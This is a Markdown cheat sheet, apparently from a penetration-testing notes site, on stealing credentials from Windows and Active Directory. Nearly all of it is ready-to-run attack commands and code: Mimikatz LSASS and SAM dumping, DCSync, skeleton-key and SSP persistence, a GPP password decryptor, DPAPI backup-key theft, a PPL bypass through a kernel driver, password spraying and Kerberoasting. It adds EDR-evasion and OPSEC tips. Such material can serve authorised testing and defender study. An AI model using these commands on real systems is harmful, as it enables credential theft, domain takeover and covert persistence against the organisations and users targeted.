---
title: "Credential Attacks — From Windows"
weight: 3
tags: ["ad", "credentials", "mimikatz", "windows", "dpapi", "lsass"]
---

## Quick Reference

| Attack | Tool | Privilege Required |
|---|---|---|
| LSASS dump (live) | Mimikatz | LocalAdmin + SeDebugPrivilege |
| LSASS dump (ProcDump) | ProcDump / comsvcs.dll | LocalAdmin |
| DCSync | Mimikatz lsadump::dcsync | Domain Admin (or replication rights) |
| Local SAM | reg save + secretsdump | LocalAdmin |
| LSA Secrets | Mimikatz lsadump::lsa | SYSTEM |
| Cached domain creds | Mimikatz lsadump::cache | SYSTEM |
| GPP passwords | PowerSploit Get-GPPPassword | Domain User (SYSVOL read) |
| DPAPI triage | SharpDPAPI | LocalAdmin (backup key needs DA) |
| WDigest cleartext | Mimikatz sekurlsa::wdigest | LocalAdmin + WDigest enabled |
| Skeleton key | Mimikatz misc::skeleton | Domain Admin (DC access) |
| SSP injection | Mimikatz misc::memssp | SYSTEM on DC |
| Password spray | DomainPasswordSpray / Rubeus | Domain User |
| PPL bypass | mimidrv.sys kernel driver | SYSTEM + vulnerable driver |

---

## Mimikatz — Core Commands

Mimikatz is the primary credential extraction tool for Windows. Most operations require `SeDebugPrivilege` at minimum, and many require SYSTEM.

### Privilege Escalation Within Mimikatz

```powershell
# Required before most operations — requests SeDebugPrivilege
privilege::debug

# Elevate token to SYSTEM context (impersonate SYSTEM token)
token::elevate
```

> **Required privileges:** `privilege::debug` requires the current process to hold `SeDebugPrivilege`. This is available to local administrators by default but must be explicitly requested. `token::elevate` impersonates a SYSTEM token — requires LocalAdmin.

### sekurlsa — LSASS-Based Credential Extraction

All `sekurlsa::` commands operate against the LSASS process. They require either live LSASS access (LocalAdmin + debug privilege) or a previously captured minidump loaded with `sekurlsa::minidump`.

```powershell
# Dump all logged-on credentials including NTLM hashes, Kerberos tickets, cleartext
sekurlsa::logonpasswords

# Extract AES128/AES256 Kerberos keys — more OPSEC-friendly than NTLM in some
# scenarios because AES keys are used by default in modern environments
sekurlsa::ekeys

# Dump cleartext credentials if WDigest caching is enabled
# Only works on Windows <= 8.0/2008R2 or if manually re-enabled via registry
sekurlsa::wdigest

# Dump all Kerberos tickets (TGTs and service tickets) from LSASS memory
sekurlsa::tickets

# Extract only NTLM hashes — faster and generates slightly less noise than logonpasswords
sekurlsa::msv
```

> **Required privileges:** LocalAdmin + `privilege::debug` (or `token::elevate` to SYSTEM). WDigest cleartext requires WDigest to be enabled on the target system.

### lsadump — SAM, LSA Secrets, and DCSync

```powershell
# Dump local SAM database (local account hashes)
lsadump::sam

# Dump LSA secrets — service account passwords, DPAPI system keys, cached creds
# /patch patches LSASS to bypass some protections
lsadump::lsa /patch

# Similar to lsa — dumps LSA secrets without patching
lsadump::secrets

# Dump cached domain logon credentials (DCC2/MSCachev2 hashes)
# These are stored for offline domain logon and are slow to crack
lsadump::cache

# DCSync — impersonate a DC replication request to pull the krbtgt hash
# This does NOT require running on the DC itself — any machine with DA credentials works
lsadump::dcsync /domain:TARGET_DOMAIN /user:krbtgt

# DCSync all accounts — outputs in CSV format
lsadump::dcsync /domain:TARGET_DOMAIN /all /csv
```

> **Required privileges:** `lsadump::sam` and `lsadump::cache` require SYSTEM. `lsadump::dcsync` requires an account with replication rights (Domain Admins, Enterprise Admins, or explicitly delegated `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`).

> **Note:** DCSync does not touch LSASS or run code on the DC. It uses the legitimate MS-DRSR (Directory Replication Service Remote Protocol) to request credential data. This makes it harder to detect through endpoint-level controls but generates distinctive domain controller event IDs (4662) in a DC security log.

### Persistence and Cleartext Capture

```powershell
# Inject a custom Security Support Provider (SSP) into LSASS
# All subsequent authentications are logged in cleartext to:
# C:\Windows\System32\kiwissp.log
misc::memssp

# Skeleton key — patch LSASS on the DC so every domain account accepts
# 'mimikatz' as a secondary password in addition to the real one
# This is entirely in-memory and is lost on DC reboot
misc::skeleton
```

> **Required privileges:** `misc::memssp` and `misc::skeleton` both require SYSTEM on the Domain Controller. These are high-impact, high-visibility operations. Skeleton key affects ALL domain accounts and is not persistent across reboots.

---

## LSASS Dump Methods for Offline Processing

When live Mimikatz execution is blocked by AV/EDR, the LSASS process can be dumped and processed on an attacker-controlled machine. This separates the noisy dump operation from the credential extraction.

### Task Manager (GUI)

Requires GUI access, LocalAdmin privileges, and Windows Defender not blocking process dumps.

```
Task Manager → Details tab → right-click lsass.exe → Create dump file
Default output: C:\Users\USERNAME\AppData\Local\Temp\lsass.DMP
```

> **Required privileges:** LocalAdmin. Does not require `SeDebugPrivilege` when using Task Manager directly, but many EDR products flag this method.

### ProcDump (Sysinternals)

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

> **Required privileges:** LocalAdmin + SeDebugPrivilege.

> **Note:** ProcDump is a signed Microsoft binary (Sysinternals). Some environments whitelist it, but modern EDR products flag `-ma lsass.exe` regardless of the binary signature. The `-accepteula` flag suppresses the EULA dialog.

### comsvcs.dll MiniDump (Living Off the Land)

Uses a built-in Windows DLL to create the dump — no external tool required.

```cmd
# First get the LSASS PID
tasklist /fi "imagename eq lsass.exe"

# Dump using comsvcs MiniDump export — PID must be the actual lsass.exe PID
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID lsass.dmp full
```

> **Required privileges:** SYSTEM (rundll32 running as SYSTEM, typically from an elevated shell using `token::elevate` or a SYSTEM service).

> **Note:** The comma after `MiniDump` is required. The `full` argument specifies a full memory dump. This technique uses a signed Windows binary and DLL but is heavily signatured in most modern EDR products.

### SharpDump

Managed-code alternative using .NET reflection to create a minidump via `MiniDumpWriteDump`.

```cmd
SharpDump.exe
```

> **Required privileges:** LocalAdmin + SeDebugPrivilege.

### Processing the Dump Offline with Mimikatz

```powershell
# Load the dump file — must be done from Mimikatz before sekurlsa commands
sekurlsa::minidump lsass.dmp

# Now run extraction against the loaded dump — runs entirely on your machine
sekurlsa::logonpasswords
sekurlsa::ekeys
sekurlsa::tickets
```

> **Note:** The dump file must be transferred to your attacker machine. Process the dump on a system where Mimikatz can run freely (e.g., your own lab machine or a VM without EDR). The dump contains credentials for all sessions active at the time of capture.

---

## SafetyKatz / SharpKatz / BetterSafetyKatz

Obfuscated and in-memory alternatives to Mimikatz designed to evade signature-based AV.

```cmd
# SafetyKatz — performs an in-memory MiniDump of LSASS, then processes it
# with an embedded Mimikatz without writing a full Mimikatz binary to disk
SafetyKatz.exe

# BetterSafetyKatz — further obfuscated version of SafetyKatz
BetterSafetyKatz.exe

# SharpKatz — C# port of specific Mimikatz modules
# Extract AES Kerberos keys
SharpKatz.exe --Command ekeys

# SharpKatz — equivalent to sekurlsa::logonpasswords
SharpKatz.exe --Command logonpasswords
```

> **Required privileges:** LocalAdmin + SeDebugPrivilege on the target system.

> **Note:** These tools reduce on-disk exposure by loading Mimikatz or its modules entirely in memory. Detection shifts to behavioral patterns (e.g., LSASS handle acquisition with specific access rights) rather than file signatures. Combine with process injection techniques for further evasion.

---

## GPP Passwords

Group Policy Preferences (GPP) allowed administrators to embed credentials in Group Policy XML files stored on SYSVOL. Microsoft published the AES-256 encryption key in a Knowledge Base article, making all cPassword values trivially decryptable. This was patched by MS14-025 which prevents creation of new GPP passwords, but existing ones in SYSVOL are never automatically removed.

### Manual SYSVOL Search

```powershell
# Recursively search SYSVOL for Groups.xml files containing cPassword
Get-ChildItem -Path \\TARGET_DOMAIN\SYSVOL -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -like "Groups.xml" }

# Also check other GPP XML files that can contain credentials
Get-ChildItem -Path \\TARGET_DOMAIN\SYSVOL -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -match "Groups|Services|Scheduledtasks|DataSources|Printers|Drives" -and $_.Extension -eq ".xml" }
```

### PowerSploit Automated Extraction

```powershell
Import-Module PowerSploit
Get-GPPPassword
```

### Manual cPassword Decryption

The cPassword field is base64-encoded AES-256 encrypted data. The decryption key is publicly documented.

```powershell
# Decode and decrypt manually (the AES key is the Microsoft-published static key)
$cPassword = "CPASSWORD_VALUE_FROM_XML"
$decoded = [System.Convert]::FromBase64String($cPassword)

# AES key (Microsoft KB2962486 — publicly disclosed)
$key = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,
                0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,
                0x09,0xa4,0x33,0x42,0x99,0xd5)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = [byte[]](0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$decryptor = $aes.CreateDecryptor()
$plaintext = [System.Text.Encoding]::Unicode.GetString($decryptor.TransformFinalBlock($decoded, 0, $decoded.Length))
$plaintext
```

> **Required privileges:** Domain user with read access to SYSVOL (default for all authenticated users). SYSVOL is readable by all domain members by design.

> **Note:** Check not just `Groups.xml` but also `Services.xml`, `ScheduledTasks.xml`, `DataSources.xml`, `Printers.xml`, and `Drives.xml` — all can contain cPassword entries.

---

## DPAPI

The Data Protection API (DPAPI) is used by Windows to protect secrets at the user and machine level. Secrets include browser saved credentials, Windows Credential Manager entries, RDP passwords, and more. The master key used for encryption is itself encrypted either with the user's password-derived key or with a domain backup key held on the DC.

### Enumerate and Decrypt with SharpDPAPI

```cmd
# Enumerate all DPAPI artifacts accessible from current context
SharpDPAPI.exe triage

# Decrypt Credential Manager entries (Windows Vault / credential files)
SharpDPAPI.exe credentials

# Decrypt Windows Vault entries
SharpDPAPI.exe vaults

# Enumerate masterkeys for current user and available users
SharpDPAPI.exe masterkeys

# Retrieve the domain DPAPI backup key (requires Domain Admin)
# Outputs the backup key blob which can decrypt any domain user's masterkey
SharpDPAPI.exe backupkey

# Use the backup key to decrypt credentials for any domain user
SharpDPAPI.exe credentials /pvk:key.pvk
SharpDPAPI.exe vaults /pvk:key.pvk
SharpDPAPI.exe masterkeys /pvk:key.pvk
```

> **Required privileges:** `backupkey` requires Domain Admin or equivalent. `credentials` and `vaults` require LocalAdmin to access other users' DPAPI paths. Current user's own DPAPI data can be decrypted with user-level access via the `/rpc` method.

### Mimikatz DPAPI Commands

```powershell
# Decrypt a specific credential file using a known masterkey hex value
dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\CRED_FILE_NAME /masterkey:MASTERKEY_HEX

# Decrypt using the domain backup private key
dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\CRED_FILE_NAME /pvk:backup.pvk

# Dump the domain backup key (must be run against the DC as DA)
lsadump::backupkeys /system:DC_HOSTNAME /export
```

> **Note:** DPAPI credential files are located at:
> - User credentials: `C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\`
> - System credentials: `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\`
> - Masterkeys: `C:\Users\USERNAME\AppData\Roaming\Microsoft\Protect\USER_SID\`

---

## Credential Manager

Windows Credential Manager stores credentials for network resources, websites (in Internet Explorer/Edge legacy), and generic credentials. These are DPAPI-protected.

### List Stored Credentials

```cmd
# List all stored credentials in Credential Manager
cmdkey /list
```

```powershell
# View credentials from PowerShell
[void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }
```

### Extract via Mimikatz

```powershell
# Decrypt a specific credential file
dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\CRED_FILE_NAME

# With an explicit masterkey
dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\CRED_FILE_NAME /masterkey:MASTERKEY_HEX
```

### SharpDPAPI for Credential Manager

```cmd
# Attempt decryption using current user's RPC masterkey (current user's own creds)
SharpDPAPI.exe credentials /rpc

# Use domain backup key to decrypt any user's credentials
SharpDPAPI.exe credentials /pvk:backup.pvk
```

> **Required privileges:** Reading another user's Credential Manager entries requires LocalAdmin. Decrypting them without the domain backup key requires matching the correct masterkey.

---

## Local SAM Database

The SAM (Security Accounts Manager) database stores NTLM hashes of local accounts. It is locked by the OS while Windows is running but can be accessed with SYSTEM privileges or through registry hive export.

### Registry Hive Export

```cmd
# Save the SAM and SYSTEM hives to disk
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Also save SECURITY hive for LSA secrets and cached creds
reg save HKLM\SECURITY C:\Temp\SECURITY
```

### Process Offline with secretsdump

Transfer the files to your attacker machine and process locally:

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

### Mimikatz Direct SAM Dump

```powershell
# Requires SYSTEM — dump SAM directly from live system
lsadump::sam
```

> **Required privileges:** `reg save` for SAM requires LocalAdmin. `lsadump::sam` in Mimikatz requires SYSTEM (use `token::elevate` first).

> **Note:** The SYSTEM hive is required to decrypt the SAM — without it the hashes cannot be extracted from the saved SAM file alone. The `boot key` (syskey) used to encrypt SAM is derived from the SYSTEM hive.

---

## WDigest Credential Caching

WDigest is an authentication protocol that requires plaintext credentials in memory. Since Windows 8.1 / Server 2012R2 it is disabled by default. If re-enabled — or if targeting older systems — Mimikatz can extract cleartext passwords from LSASS.

### Enable WDigest (requires Registry write access)

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

### Verify Current State

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```

### Wait for Re-authentication

After enabling WDigest, cleartext credentials only appear in LSASS after the user re-authenticates. Force re-authentication:

```cmd
# Lock the current session (forces re-auth on unlock)
rundll32.exe user32.dll, LockWorkStation
```

### Extract Cleartext

```powershell
sekurlsa::wdigest
```

> **Required privileges:** Registry write access to HKLM requires LocalAdmin. Dumping from LSASS requires LocalAdmin + `privilege::debug`.

> **Note:** Modifying `UseLogonCredential` is a highly signatured registry key change. Modern EDR products detect and alert on this modification almost universally. Combine with OPSEC measures or target legacy systems where WDigest is already enabled.

---

## LSA Protection Bypass (PPL)

Protected Process Light (PPL) is a security mechanism that prevents user-mode processes from accessing LSASS memory even with LocalAdmin privileges. When enabled, LSASS runs as a protected process and standard Mimikatz operations fail.

### Check PPL Status

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

A value of `1` indicates PPL is enabled. Value `0` or key absent means PPL is not active.

### PPL Bypass via Vulnerable Kernel Driver (mimidrv.sys)

Mimikatz includes a kernel driver (`mimidrv.sys`) that can remove PPL protection from LSASS by patching kernel structures.

```powershell
# Load the Mimikatz driver — requires SeLoadDriverPrivilege (LocalAdmin)
!+

# Remove PPL protection from lsass.exe
!processprotect /process:lsass.exe /remove

# Now standard LSASS operations work
sekurlsa::logonpasswords
```

> **Required privileges:** `SeLoadDriverPrivilege` for loading the driver (available to LocalAdmin). Driver loading creates kernel-level activity that is extremely visible to EDR products with kernel callbacks.

> **Note:** The mimidrv.sys driver approach is heavily detected. Alternatives include PPLdump (exploits a Windows design issue to dump PPL processes from user-mode) and commercial exploit-based bypasses. PPL bypass should be treated as a last resort given detection risk.

---

## Password Spraying from Windows

Password spraying attempts a single (or few) passwords against many accounts to avoid lockout thresholds. Always verify the domain password policy before spraying.

### Check Password Policy First

```powershell
# Using built-in cmdlet
Get-ADDefaultDomainPasswordPolicy

# Using net commands (works without AD module)
net accounts /domain
```

### DomainPasswordSpray

```powershell
Import-Module .\DomainPasswordSpray.ps1

# Spray a single password against all domain users
Invoke-DomainPasswordSpray -Password 'PASSWORD' -OutFile sprayed.txt

# Spray against a specific user list (useful if not domain-joined)
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 'PASSWORD' -OutFile sprayed.txt

# Spray with a domain specified explicitly
Invoke-DomainPasswordSpray -Password 'PASSWORD' -Domain TARGET_DOMAIN -OutFile sprayed.txt
```

### Rubeus Spray

```cmd
# Spray a password across all domain users — does not request tickets, just tests auth
Rubeus.exe brute /password:PASSWORD /noticket

# Spray against a specific user list
Rubeus.exe brute /users:users.txt /password:PASSWORD /noticket /domain:TARGET_DOMAIN /dc:DC_IP
```

> **Required privileges:** Domain user account (or any machine on the domain network). No elevated privileges required.

> **Note:** Always check `badPwdCount` progression and lockout thresholds before spraying. The default domain policy typically locks after 5 attempts. DomainPasswordSpray automatically queries the password policy and incorporates a spray delay to stay below the threshold. Common target passwords: `SeasonYear!` (e.g., `Spring2024!`), `CompanyName1!`, `Welcome1`, `Password1`.

---

## Kerberoasting from Windows

Kerberoasting requests service tickets (TGS) for accounts with SPNs set and attempts offline cracking of the RC4-encrypted ticket blob.

```powershell
# List accounts with SPNs (enumeration only)
Get-DomainUser -SPN -Properties samaccountname, ServicePrincipalName

# Request ticket and output Hashcat format via PowerView
Get-DomainUser -Identity USERNAME | Get-DomainSPNTicket -Format Hashcat

# Export all SPNs in CSV via PowerView
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tickets.csv -NoTypeInformation
```

```cmd
# Rubeus — kerberoast all SPN accounts
Rubeus.exe kerberoast /nowrap

# Target only accounts with admincount=1 (higher privilege targets)
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Target a specific user
Rubeus.exe kerberoast /user:SPN /nowrap

# Force RC4 downgrade even if target supports AES (easier to crack)
Rubeus.exe kerberoast /tgtdeleg /user:SPN /nowrap
```

> **Required privileges:** Any authenticated domain user. No elevated privileges needed.

> **Note:** RC4-encrypted TGS hashes crack significantly faster than AES-256. Use `/tgtdeleg` to request an RC4 ticket even from accounts configured for AES. Cracking: `hashcat -m 13100` for RC4 (`$krb5tgs$23$`), `hashcat -m 19700` for AES-256 (`$krb5tgs$18$`).

---

## AS-REP Roasting from Windows

AS-REP roasting targets accounts with Kerberos pre-authentication disabled (`DONT_REQUIRE_PREAUTH` UAC flag). The KDC returns an AS-REP encrypted with the account's key, which can be cracked offline.

```cmd
# Rubeus — roast all accounts with pre-auth disabled
Rubeus.exe asreproast /nowrap /format:hashcat

# Target a specific user
Rubeus.exe asreproast /user:USERNAME /nowrap /format:hashcat
```

```powershell
# Enumerate accounts with pre-auth disabled using PowerView
Get-DomainUser -UACFilter DONT_REQ_PREAUTH -Properties samaccountname, useraccountcontrol
```

> **Required privileges:** Any authenticated domain user for roasting. No special rights needed to request AS-REP for pre-auth disabled accounts.

> **Note:** Crack with `hashcat -m 18200` for `$krb5asrep$23$` format. Pre-authentication disabled is rare on modern, well-managed domains but still appears in legacy environments and misconfigurations.

---

## ACL Abuse — Credential-Related Vectors

Some ACL misconfigurations lead directly to credential access.

```powershell
# Find all interesting ACLs in the domain
Find-InterestingDomainAcl -ResolveGUIDs

# Find ACLs where your current user/group has permissions
$sid = Convert-NameToSid USERNAME
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object { $_.SecurityIdentifier -eq $sid }
```

### Targeted Kerberoasting via ACL (GenericWrite / GenericAll)

If you have `GenericWrite` or `GenericAll` on a user, you can set a fake SPN on that account and Kerberoast it even if it had no SPN.

```powershell
# Set a fake SPN on the target user
Set-DomainObject -Credential $Cred -Identity USERNAME -SET @{serviceprincipalname='fake/SPN'} -Verbose

# Kerberoast the account
Rubeus.exe kerberoast /user:USERNAME /nowrap

# Clean up after cracking
Set-DomainObject -Credential $Cred -Identity USERNAME -Clear serviceprincipalname -Verbose
```

### Force Password Change via ACL (ForceChangePassword)

```powershell
$NewPassword = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $NewPassword -Credential $Cred -Verbose
```

> **Required privileges:** The ACL permission on the target object. `GenericWrite` for SPN setting, `ForceChangePassword` for password reset.

---

## OPSEC Notes

- `sekurlsa::logonpasswords` acquires a handle to LSASS with `PROCESS_VM_READ` — this is the most-detected access pattern. Modern EDR products alert on handle acquisition to LSASS regardless of the tool.
- `lsadump::dcsync` generates Windows event 4662 on the DC (object access) with specific GUIDs for replication rights. It does not touch LSASS but is visible on domain controller security logs.
- `misc::skeleton` patches kernel memory on a live DC — this is catastrophic from an OPSEC standpoint and is used only when persistence takes priority over stealth.
- Prefer `sekurlsa::ekeys` over `sekurlsa::logonpasswords` where possible — AES keys are equally useful for Pass-the-Key/Overpass-the-Hash and generate a smaller dump footprint.
- For LSASS dumps, comsvcs.dll MiniDump is often less detected than ProcDump due to the legitimate binary being used, but behavioral detection on LSASS access rights remains the same.

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
